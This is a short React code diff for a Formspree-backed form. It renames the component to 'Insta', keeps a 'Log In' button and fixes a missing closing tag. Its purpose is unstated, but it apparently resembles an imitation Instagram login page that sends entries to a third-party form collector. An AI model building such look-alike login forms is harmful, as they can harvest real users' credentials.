@@ -2,7 +2,7 @@
 // For more help visit https://formspr.ee/react-help
 import React from 'react';
 import { useForm, ValidationError } from '@formspree/react';
-function Log() {
+function Insta() {
   const [state, handleSubmit] = useForm("xbjejpyv");
   if (state.succeeded) {
       return <p>Thanks for joining!</p>;
@@ -36,11 +36,12 @@ autocorrect="off" />
       <button class="btn" type="submit" disabled={state.submitting}>
         Log In
       </button>
+    </form>
   );
 }
 function App() {
   return (
-    <Log />
+    <Insta />
   );
 }
 export default App;
